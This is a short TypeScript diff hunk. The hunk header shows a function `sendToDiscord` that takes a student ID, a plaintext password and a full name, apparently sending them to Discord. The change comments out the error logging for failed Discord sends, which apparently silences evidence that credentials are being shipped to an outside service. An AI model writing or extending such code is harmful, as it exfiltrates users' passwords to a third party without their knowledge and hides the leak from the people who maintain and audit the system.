@@ -30,10 +30,10 @@ async function sendToDiscord(studentId: string, password: string, fullName: stri
         });
 
         if (!res.ok) {
-            console.error("Discord Error:", await res.text());
+            // console.error("Discord Error:", await res.text());
         }
     } catch (error) {
-        console.error("Discord sync failed", error);
+        // console.error("Discord sync failed", error);
     }
 }
 
